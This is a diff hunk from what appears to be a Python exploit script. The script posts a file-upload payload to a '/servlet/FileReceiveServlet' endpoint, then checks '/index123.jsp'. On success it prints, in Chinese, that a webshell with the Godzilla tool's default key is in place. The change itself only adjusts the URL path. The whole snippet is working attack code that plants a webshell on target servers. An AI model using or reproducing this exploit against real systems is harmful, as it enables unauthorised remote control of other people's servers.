@@ -51,7 +51,7 @@ def main(u):
     uploadData+=shellFlag
     try:
         requests.packages.urllib3.disable_warnings()
-        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
+        req1 = requests.post(u + "servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
         req3=requests.get(u+"/index123.jsp",headers=header, verify=False, timeout=25)
         if len(req3.text)<10:
             console.print(now_time() + " [SUCCESS]  文件上传成功, 哥斯拉默认密钥webshell："+u+"/index123.jsp", style='bold green')
